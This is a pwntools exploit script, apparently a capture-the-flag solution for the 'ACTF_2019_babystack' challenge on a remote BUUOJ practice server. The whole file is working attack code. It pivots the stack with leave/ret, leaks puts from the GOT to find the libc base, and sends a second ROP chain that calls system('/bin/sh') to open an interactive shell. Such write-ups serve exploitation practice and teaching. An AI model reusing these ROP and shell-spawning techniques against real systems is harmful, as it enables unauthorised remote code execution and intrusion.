from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ACTF_2019_babystack')
io = remote('node4.buuoj.cn', 25945)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('ACTF_2019_babystack')
main = 0x4008f6
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
leave_ret = 0x400a18
pop_rdi_ret = 0x400ad3
ret = 0x400709

io.sendlineafter('>', str(0xe0))
io.recvuntil('Your message will be saved at ')
buf = int(io.recvn(14), 16)
payload = cyclic(8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
payload += cyclic(0xA8)
payload += p64(buf) + p64(leave_ret)
io.sendafter('>', payload)
io.recvline()
libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
io.sendlineafter('>', str(0xe0))
io.recvuntil('Your message will be saved at ')
buf = int(io.recvn(14), 16)
payload = cyclic(8) + p64(ret) +p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
payload += cyclic(0xA8)
payload += p64(buf) + p64(leave_ret)
io.sendafter('>', payload)
io.interactive()
